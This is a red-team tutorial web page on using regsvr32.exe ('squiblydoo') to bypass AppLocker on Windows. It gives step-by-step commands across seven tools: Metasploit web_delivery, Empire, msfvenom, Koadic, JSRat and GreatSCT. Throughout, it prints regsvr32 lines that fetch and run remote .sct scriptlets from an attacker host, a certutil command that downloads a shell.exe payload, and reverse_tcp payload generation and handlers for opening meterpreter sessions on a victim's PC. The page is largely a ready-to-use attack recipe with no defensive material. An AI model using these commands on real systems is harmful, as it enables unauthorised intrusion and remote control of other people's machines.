<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: regsvr32</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-regsvr32/" rel="bookmark"><time class="entry-date published" datetime="2019-01-23T09:59:24+00:00">January 23, 2019</time><time class="updated" datetime="2025-05-16T10:53:32+00:00">May 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The purpose to write this post is to demonstrate the most common and familiar techniques of whitelisting AppLocker bypass.  As we know, for security reasons, the system admin add group policies to restrict app execution for a local user. In our previous article, we had discussed “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/"><span style="color: #0000ff;">Windows Applocker Policy – A Beginner’s Guide</span></a></strong>” as they define the AppLocker rules for your application control policies and how to work with them. But today you will learn how to bypass Applocker policies with regsvr32.exe.</span></p>
<h3><span style="color: #800000;">Tables of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction to regsvr</span></strong></li>
<li><strong><span style="color: #000000;">Working of regsvr</span></strong></li>
<li><strong><span style="color: #000000;">Multiple methods to attack regsvr</span></strong></li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span> </span></h3>
<p><span style="color: #000000;">Regsvr32 stands for Microsoft Register Server. It is the windows command-line utility tool. While regsvr32 causes problems sometimes; it’s an important file as its windows system file. The file is found in the subfolder of C:\Windows. This file is able to observe, track and influence other programs. Users mainly use it to register and unregister programs in the Windows file extension .exe, and the process widely assists OLE (Object Linking and Embedding), DLL (Data Link Libraries), and OCX (ActiveX control modules). The process works in the background and users can see it with a task manager. Its Microsoft’s one of the trusted files.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Working</span> </span></h3>
<p><span style="color: #000000;">When you register a DLL file in regsvr32, Windows adds information about programs associated with regsvr32. Developers access these defences to understand where the program data is and how to interact with it. While you register a DLL file, the system adds information to the central directory so that Windows can use it. The whole path of these files literally has the executable code and due to these files Windows can call upon specific functions. These files are very convenient as when the software is updated, these files automatically call upon the updated version; in short, it helps avoid the version problems of software. Usually, this file is not commonly used except for registering and unregistering DLL files.</span></p>
<p><span style="color: #000000;">RegSvr32.exe has the following command-line options:</span></p>
<p><span style="color: #000000;"><em>Syntax: Regsvr32 [/s][/u] [/n] [/i[:cmdline]] &lt;dllname&gt;</em></span></p>
<p><span style="color: #000000;">/u – Unregister server</span><br/>
<span style="color: #000000;">/i – Call DllInstall passing it an optional [cmdline]; when it is used with /u, it calls to dll uninstall</span><br/>
<span style="color: #000000;">/n – do not call DllRegisterServer; this option must be used with /i</span><br/>
<span style="color: #000000;">/s – Silent; display no message boxes</span></p>
<p>To know more about it, visit here: //support.microsoft.com/en-us/help/249873/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages</p>
<h3><span style="color: #800000;">Multiple Methods</span></h3>
<ul>
<li><span style="color: #000000;">Web delivery</span></li>
<li><span style="color: #000000;">Empire</span></li>
<li><span style="color: #000000;">Manual</span></li>
<li><span style="color: #000000;">MSFVenom</span></li>
<li><span style="color: #000000;">Koadic</span></li>
<li><span style="color: #000000;">JSRat</span></li>
<li><span style="color: #000000;">GreatSCT</span></li>
</ul>
<h3><span style="color: #800000;">Web Delivery</span></h3>
<p><span style="color: #000000;">This module quickly fires up a web server that serves a payload. The provided command will allow for a payload to download and execute. It will do it either through a specified scripting language interpreter or “squiblydoo” via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection.</span></p>
<p><span style="color: #000000;">Regsvr32 uses the “squiblydoo” technique for bypassing application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request a <strong>.sct</strong> file and then execute the included PowerShell command inside of it. Both web requests (i.e., the .sct file and PowerShell download/execute) can occur on the same port. “PSH (Binary)” will write a file to the disk, allowing for custom binaries to be served up to be downloaded/executed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 3
msf exploit (web_delivery)&gt; set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt; set lhost 192.168.1.109
msf exploit (web_delivery)&gt;set srvhost 192.168.1.109
msf exploit (web_delivery)&gt;exploit</pre>
<p><span style="color: #000000;">Copy the highlighted text shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-3PrIBqXGS2w/XEg1su-xxNI/AAAAAAAAcTg/KdveMpRMsAgDUaMohitUUZgGnIeiTLZZgCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Once the exploit is running; you will have a URL made for you. Run that URL in the command prompt of the Victim’s PC as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32 /s /n /u /i://http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-E0E3sCmvrzA/XEg1ukhqnZI/AAAAAAAAcUI/oph6qWtkHLICLjKHXIooqrBj10NKJdh8ACEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Once you hit enter after the command, you will have your session. Type ‘sysinfo’ for the information of the PC as shown in the image below:</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-h327CvcMLWE/XEg1w4e9FpI/AAAAAAAAcUw/P221xjRSKSMQcl4ulrTZ07zjI0UYwwjxQCEwYBhgL/s1600/3.png" alt="Windows Exploitation using Regsvr32" width="768" height="331"/></span></p>
<h3><span style="color: #800000;">PowerShell Empire</span></h3>
<p><span style="color: #000000;">For our next method of regsvr Attack, we will use Empire. Empire is a post-exploitation framework. Till now, we have to pair our .sct tacks with Metasploit but in this method, we will use the empire framework. It’s solely a python-based PowerShell Windows agent, which makes it quite useful. Empire is developed by <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://x.com/harmj0y">@harmj0y</a>,</span> <span style="color: #0000ff;"><a style="color: #0000ff;" href="//twitter.com/sixdub">@sixdub</a>,</span> <span style="color: #0000ff;"><a style="color: #0000ff;" href="//twitter.com/enigma0x3">@enigma0x3</a>,</span> <span style="color: #0000ff;"><a style="color: #0000ff;" href="//twitter.com/424f424f">rvrsh3ll</a>,</span> <span style="color: #0000ff;"><a style="color: #0000ff;" href="//twitter.com/killswitch_gui">@killswitch_gui</a>,</span> and <span style="color: #0000ff;"><a style="color: #0000ff;" href="//twitter.com/xorrior">@xorrior</a>.</span> You can download this framework from <strong><a href="https://github.com/BC-SECURITY/Empire">Empire</a></strong></span></p>
<p><span style="color: #000000;">To have a basic guide of Empire, please visit our article introducing Empire: <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/</a></span></strong></span></p>
<p><span style="color: #000000;">Once the empire framework is started, type listener to check if there are any active listeners. As you can see in the image below that there are no active listeners. So to set up a listener, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistner http
set Host http://192.168.1.109
execute</pre>
<p><span style="color: #000000;">With the above commands, you will have an active listener. Type back to go out of the listener so you can initiate your PowerShell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-sEnwfIKiiaA/XEg1ym7NkLI/AAAAAAAAcVM/IiMZT1ORBbAo_-DAzLnIPoApgYXDJ-ihACEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Once you are out of the listener, you need to use an exploit to create your malicious file. A stager, in the empire, is a snippet of code that the agent uses to run our malicious code on the compromised host. This means to create an exploit, we will have to usestager. Therefore, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_sct
set listener http
execute</pre>
<p><span style="color: #000000;">After the execution of executing the command, usestager will create a launcher.sct in /tmp. Now to get the session start the python server by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;">As the server is on, the only step left is to execute our malware on the victim’s PC. For this, type the following command in the command prompt :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr /s /n /u /i:http://192.168.1.109:8080/tmp/launcher.sct scrobj.dll</pre>
<p><span style="color: #000000;">In the above command, we used port 8080 because our Python server is activated on the same port.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-HxWqVM2_oZ4/XEg1y-r4qKI/AAAAAAAAcVQ/EGn6Wu9cyREOYYVp4ioQv9Lu9iWpWgfLwCEwYBhgL/s1600/5.png" alt="Windows Exploitation using Regsvr32" width="900" height="698"/></span></p>
<p><span style="color: #000000;">Once the above is executed as told, you will receive a session. To access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact 9ATUX4M7</pre>
<p><span style="color: #000000;">9ATUX4M7: is an agent/session name. this will vary from session to session.</span></p>
<h3><span style="color: #800000;">Inject PowerShell code in sct File (Manual Method)</span></h3>
<p><span style="color: #000000;">Our next method manual with the help of an exploit. The exploit we will use will help us to create a powershell code. So let’s first create our powershell and for this go to the terminal of kali and type </span></p>
<p><span style="color: #000000;">After running this exploit, it will show you the powershell code on the terminal screen as shown in the following image :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 2
msf exploit (web_delivery)&gt; set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt; set lhost 192.168.1.109
msf exploit (web_delivery)&gt;set srvhost 192.168.1.109
msf exploit (web_delivery)&gt;exploit</pre>
<p><span style="color: #000000;">Copy the highlighted text shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-CoiRfBCdv04/XEg1zc1muTI/AAAAAAAAcVY/46vfvVBkCq8zFF_yu0O4IOP0qbwQQfggACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Regsvr32 is a command-line utility to register and unregister OLE controls, such as DLLs and ActiveX controls, in the Windows Registry. Regsvr32.exe is installed in the %systemroot%\System32 folder in Windows XP and later versions of Windows.</span></p>
<p><span style="color: #000000;">Now we need to create a .sct file for our attack to run. We found a script online to create a .sct file. You can access the link for the script by clicking<strong> </strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="//gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba"><strong>here</strong></a></span>. The script is shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-4nPy2avK66g/XEg1zCGa51I/AAAAAAAAcVU/rfcQoo8j4vUjMkcOnwXqndnnzK_1m6kwACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Copy the PowerShell code that web_delivery created and paste it in the above script where it says “calc.exe” as shown in the image below, and then finally save it with a .sct extension.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-MJiHjLqpNpM/XEg1zo7FztI/AAAAAAAAcVc/lMsTPChYF7oCav7w14Z87TBhT-s9v40uQCEwYBhgL/s1600/8.1.png" alt="Windows Exploitation using Regsvr32" width="924" height="320"/></span></p>
<p><span style="color: #000000;">Then just like before, run the following command to execute the .sct file with regsvr32.exe in the victim’s PC:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32 /u /n /s /i:http://192.168.1.109/1.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Vaxi32A-G9A/XEg1zoaBwOI/AAAAAAAAcVg/VpBDCqTmrkEvPwkxqUy6xv-d4rTN2h1sACEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">As soon as the above command is executed, you will have your session through web_delivery. To access the session type ‘sessions 1’ and ‘info’ to have basic information about the system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Az_kKtl-qV4/XEg1z1zOq9I/AAAAAAAAcVk/NISKrN97CAY34OZybDZDIDJVT0Ota9ngACEwYBhgL/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">MsfVenom</span></h3>
<p><span style="color: #000000;">Our next method is to use msfvenom. Through this method, we will create two .sct files, one to download our malware and another to execute it.  But first let’s get going with msfvenom and for that type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe &gt; shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-u0Mu1tr4QtY/XEg1sunEvBI/AAAAAAAAcTk/yf9BILzoH9M6NJHJACcg7X57qioMJBEtACEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Startup the python server using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;">And simultaneously, in the same script, used in the previous method inject a certutil.exe command to call the shell.exe file from a remote server. Therefore, instead of “calc .exe” write the following and save the file again with .sct extension:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe</pre>
<p><span style="color: #000000;">We have used certutil here as it allows to download a file in windows and also saved the file as 3.sct.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-G2pubZ7dVSg/XEg1stcj-KI/AAAAAAAAcTo/0M8k7MkzpwI_NKYhaNroW02jI_Wfo9wXwCEwYBhgL/s1600/11.png" alt="Windows Exploitation using Regsvr32" width="1223" height="309"/></span></p>
<p><span style="color: #000000;">Now, run the above script using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32 /u /n /s /i:http;//192.168.1.109/3.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-bkv7CyRCw60/XEg1tJVOQoI/AAAAAAAAcTs/nwfSHLntYuwIEc4RzrP_fUT5KFrLm6vewCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We will create another file to execute our previous file “shell.exe”. For that again take the same script and where its written “calc.exe”; therefore write :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd /k cd c:\Users\raj &amp; shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Ka6ggMmVD7s/XEg1tVzCvHI/AAAAAAAAcTw/HpFDcnEfZCUsKBDbFoRf4U9Anq8G6THrwCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">This we have saved the script as 4.sct and again run this script using the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32 /u /n /s /i:http://192.168.1.109/4.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-18AYz4WtuCU/XEg1tfR0H0I/AAAAAAAAcT0/seiYVHqOUz4ABAGqpXxfDjxYEJPgvS6EACEwYBhgL/s1600/14.png" alt="Windows Exploitation using Regsvr32" width="597" height="35"/></span></p>
<p><span style="color: #000000;">Simultaneously, start up the multi handler too, to get a session. Hence, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">After running the command in the victim’s PC, u will have a meterpreter session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-6dS79rgvfJQ/XEg1tztqMHI/AAAAAAAAcT4/UmwPW8VjJlAtLrMSHuxa6Tn5-w6yFYc8wCEwYBhgL/s1600/15.png"/></span></p>
<h3><span style="color: #800000;">Koadic</span></h3>
<p><span style="color: #000000;">Our next method is using Koadic. Koadic is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. To know more about Koadic please read our detailed article on the said framework through this link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/koadic-com-command-control-framework">https://www.hackingarticles.in/koadic-com-command-control-framework</a></span></span></p>
<p><span style="color: #000000;">Once the koadic is up and running, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use stager/js/regsvr
set srvhost 192.168.1.107
run</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-yZ3So6l6RBY/XEg1uNBUJbI/AAAAAAAAcT8/EGj90aOj-EocNpdZODWKl-qmWTiQtia3wCEwYBhgL/s1600/17.png" alt="Windows Exploitation using Regsvr32" width="673" height="492"/></span></p>
<p><span style="color: #000000;">After this, type the following in the command prompt of the victim’s PC:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32 /u /n /s /i:http://192.168.1.107:9998/uWBjv scrobj.dll</pre>
<p><span style="color: #000000;">Once you run the above command, you will have a session. To access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zombies 0</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/--BXOIKaYycI/XEg1uOzXkSI/AAAAAAAAcUA/xxxIcvAOvEQFcBYjpIbM0bg51_Y171fCgCEwYBhgL/s1600/18.png"/></span></p>
<h3><span style="color: #800000;">JSRat</span></h3>
<p><span style="color: #000000;">Our next method of attacking regsvr32 is by using JSRat and you can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="//github.com/Hood3dRob1n/JSRat-Py">GitHub</a></strong></span>. This is another very small command and control framework just like koadic and Powershell Empire for generating malicious task only for rundll32.exe and regsvr32.exe. JSRat will create a web server and on that web server, we will find our .sct file. To use this method type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./JSRat.py -I 192.168.1.107 -p 4444</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-v2qh2sqwyKc/XEg1uWAhPpI/AAAAAAAAcUE/wbKQiXfPkRcLe6ub6_dw0NgPXJt9u6d-ACEwYBhgL/s1600/19.png" alt="Windows Exploitation using Regsvr32" width="628" height="130"/></span></p>
<p><span style="color: #000000;">Running the above command will start the web server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-QzYZTik2y0M/XEg1ulKYpnI/AAAAAAAAcUM/jLK_b7_fkWc-xdmyhkHiwLm5LOYmSA9kwCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Open this in your browser as shown below. Here, you will find the .sct file that you need to run on your victim’s PC.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-7SeHmUcneoM/XEg1u5z8aYI/AAAAAAAAcUQ/d_hh7SJa0SgC0GYKMLaOPXiFG-4LCtRTgCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">As we have got the command, run the command in the run window as shown in the image below:</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-wPhAj3IfB2A/XEg1vdbyBaI/AAAAAAAAcUU/zXoyVBhQBWMGNDWJfaUbPajk7TgTXmTKACEwYBhgL/s1600/22.png" alt="Windows Exploitation using Regsvr32" width="409" height="203"/></span></p>
<p><span style="color: #000000;">After executing the command in the Run window you will have a session as shown:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-GJTkZZziers/XEg1vpCRZMI/AAAAAAAAcUY/7MaDoADwYCwC5JWZvE9DqDZdoYZqaHHzgCEwYBhgL/s1600/23.png"/></span></p>
<h3><span style="color: #800000;"><strong>GreatSCT</strong></span></h3>
<p><span style="color: #000000;">GreatSCT is a tool that allows you to use Metasploit exploits and lets it bypass most anti-viruses. It is currently under support by @ConsciousHacker. You can download it from</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/GreatSCT/GreatSCT</pre>
<p><span style="color: #000000;">Once it’s downloaded and running, type the following command to access the modules :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use Bypass</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-RzgnCNA4lEQ/XEg1v0X6VLI/AAAAAAAAcUg/YJC2DBCJC40-QHlRixn4EX8gfsWTBFCpwCEwYBhgL/s1600/24.png" alt="Windows Exploitation using Regsvr32" width="765" height="372"/></span></p>
<p><span style="color: #000000;">Then type ‘list’  to get the list of modules.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-OkZpLjF0ANA/XEg1v7zKnJI/AAAAAAAAcUc/n4w1N1ct2yAA6MCRCAe0gJDNaSIovvDaQCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">A list of modules will appear as shown in the image below:</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-fpdD8Spz-cQ/XEg1wOzoZdI/AAAAAAAAcUk/BWYAae3cqtwYRJKugP8tJ2zcclcygMuGwCEwYBhgL/s1600/27.png" alt="Windows Exploitation using Regsvr32" width="744" height="799"/></span></p>
<p><span style="color: #000000;">From the list of modules choose the following :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use regsvr/shellcode_iject/base64_migrate.py
generate</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-rHu6THK7pAU/XEg1wWNgbcI/AAAAAAAAcUo/MeIOzWSi7eg4KpR34dWH6f64I9_Fmp5kQCEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">After the above commands, <strong>type 1</strong> to choose MSFVenom</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-gzFNQ-mRMUY/XEg1wU2CkTI/AAAAAAAAcUs/dVv3hMNqh94kkiygw2bS13zwAfinAqUfACEwYBhgL/s1600/29.png" alt="Windows Exploitation using Regsvr32" width="739" height="277"/></span></p>
<p><span style="color: #000000;">Then it will ask you for the payload. Just press enter, as it will take <strong>windows/meterpreter/reverse_tcp</strong> as a default payload, and that is the one we need. After that, provide IP like here we have given 192.168.1.107 and the given port (any), as you can see in the image below, that we have given lport as 2345</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-RscyqfcDO-k/XEg1xAdX2jI/AAAAAAAAcU0/WoYjEgy5xQY4oeVMLAkeAViZOSKaslFcgCEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;">After giving the details, it will ask you a name for your malware. By default, it will set name ‘payload’ so either you can give a name or just press enter for the default settings.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-EWhsp_VgTFg/XEg1xDa3MtI/AAAAAAAAcU4/vKTku6yAarYmQLafgaYAx2hrSWCpFkoEwCEwYBhgL/s1600/33.png" alt="Windows Exploitation using Regsvr32" width="740" height="217"/></span></p>
<p><span style="color: #000000;">And just as you press enter it will generate two files. One of them will be a resource file and others will be a .sct file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-8LIqw6i0oo8/XEg1xu5DYYI/AAAAAAAAcU8/AqYMMzI_iEU1M17XugABKTXhIK8glu4sACEwYBhgL/s1600/34.png"/></span></p>
<p><span style="color: #000000;">Now, firstly, start the python’s server in /usr/share/greatsct-output by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-NQhPT3f12HA/XEg1x0lobAI/AAAAAAAAcVA/jNYaDTiAJGw9k--kGIAOJ8iVh6444MpQACEwYBhgL/s1600/35.png"/></span></p>
<p><span style="color: #000000;">Now execute the .sct file in the run window of the victim’s PC as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-d5N_qTmNWmM/XEg1yDT4FoI/AAAAAAAAcVI/ecq14eKPo4s-BZ_7rp5k65XjINVBpeLOgCEwYBhgL/s1600/36.png"/></span></p>
<p><span style="color: #000000;">Simultaneously, start the multi/handler using the resource file. For this, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</pre>
<p><span style="color: #000000;">And you have a meterpreter session.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-YiVmVrX9M8U/XEg1yO9840I/AAAAAAAAcVE/_6Yq4gLgQgw1xq8ZMmKUVWkcUJEQazy1ACEwYBhgL/s1600/37.png" alt="Windows Exploitation using Regsvr32" width="810" height="525"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span></span></h3>
<p><span style="color: #000000;">Using regsvr32 to gain a session is an unusual way, but it’s very important. And so above mentioned methods use different tools and software to allow us to perform this attack.</span></p>
<p><span style="color: #000000;">To learn more about Windows Exploitation. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <span style="color: #0000ff;"><strong><a class="broken_link" style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
